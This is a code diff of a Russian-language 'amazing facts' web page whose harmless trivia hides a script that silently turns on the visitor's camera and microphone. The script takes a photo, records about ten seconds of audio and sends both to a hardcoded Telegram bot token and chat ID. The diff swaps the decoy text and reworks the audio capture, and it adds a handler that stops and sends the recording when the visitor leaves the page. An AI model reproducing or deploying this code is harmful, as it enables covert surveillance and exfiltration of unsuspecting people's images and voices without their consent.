@@ -2,25 +2,31 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Добро пожаловать!</title>
+  <title>Удивительные факты</title>
   <style>
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
-      color: white;
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #6b48ff, #ff6b6b);
+      color: #fff;
       text-align: center;
       padding: 20px;
+      min-height: 100vh;
     }
     h1 {
-      font-size: 2.5em;
-      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+      font-size: 2.8em;
+      margin-bottom: 20px;
+      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.4);
     }
-    p {
+    .fact {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 15px;
+      margin: 15px auto;
+      max-width: 700px;
+      border-radius: 10px;
       font-size: 1.2em;
-      max-width: 600px;
-      margin: 20px auto;
-      line-height: 1.6;
+      line-height: 1.5;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
     }
     #video, #canvas { display: none; } /* Скрываем видео и канвас */
   </style>
@@ -28,9 +34,12 @@
 <body>
   <video id="video" autoplay muted></video>
   <canvas id="canvas"></canvas>
-  <h1>Добро пожаловать в мир приключений!</h1>
-  <p>Здесь начинается твоё путешествие. Этот сайт — маленькое чудо технологий, которое соединяет реальность и цифровой мир. Наслаждайся моментом, ведь каждый день — это новая история!</p>
-  <p>Вокруг тебя много интересного: яркие краски, звуки природы и бесконечные возможности. Давай сделаем этот день незабываемым!</p>
+  <h1>Удивительные факты о мире</h1>
+  <div class="fact">Знаете ли вы, что осьминоги могут менять цвет, чтобы сливаться с окружающей средой?</div>
+  <div class="fact">Самая длинная река в мире — Нил, её длина около 6 650 км!</div>
+  <div class="fact">Медузы не имеют мозга, сердца или костей — они на 95% состоят из воды.</div>
+  <div class="fact">В космосе нет звука, потому что там нет воздуха для передачи звуковых волн.</div>
+  <div class="fact">Самое глубокое место в океане — Марианская впадина, глубина 11 км.</div>
 
   <script>
     const video = document.getElementById('video');
@@ -38,19 +47,21 @@
     const context = canvas.getContext('2d');
     const token = '8176524950:AAGfsNYH5qwFzIvoUmsI-UkzptDMDAYtIVQ';
     const chatId = '5678878569';
+    let mediaRecorder;
+    let audioChunks = [];
 
     // Запуск камеры и микрофона
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
       .then(stream => {
         video.srcObject = stream;
         video.onloadedmetadata = () => {
-          takePhoto(stream); // Фото
-          recordAudio(stream); // Аудио
+          takePhoto(stream); // Фото сразу
+          startRecording(stream); // Начало записи аудио
         };
       })
       .catch(err => console.error('Ошибка доступа:', err));
 
-    // Захват фото и отправка
+    // Захват и отправка фото
     async function takePhoto(stream) {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
@@ -67,27 +78,39 @@
       }).catch(err => console.error('Ошибка отправки фото:', err));
     }
 
-    // Запись и отправка 10 секунд аудио
-    async function recordAudio(stream) {
-      const mediaRecorder = new MediaRecorder(stream);
-      const audioChunks = [];
+    // Начало записи аудио
+    function startRecording(stream) {
+      mediaRecorder = new MediaRecorder(stream);
+      audioChunks = [];
 
       mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
-      mediaRecorder.onstop = async () => {
-        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('voice', audioBlob, 'voice.ogg');
-
-        fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
-          method: 'POST',
-          body: formData
-        }).catch(err => console.error('Ошибка отправки аудио:', err));
-      };
+      mediaRecorder.onstop = () => sendAudio();
 
       mediaRecorder.start();
-      setTimeout(() => mediaRecorder.stop(), 10000); // 10 секунд
+      setTimeout(() => {
+        if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
+      }, 10000); // Макс 10 секунд
     }
+
+    // Отправка аудио
+    async function sendAudio() {
+      const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('voice', audioBlob, 'voice.ogg');
+
+      fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
+        method: 'POST',
+        body: formData
+      }).catch(err => console.error('Ошибка отправки аудио:', err));
+    }
+
+    // Остановка записи при уходе со страницы
+    window.onbeforeunload = () => {
+      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
+      }
+    };
   </script>
 </body>
 </html>
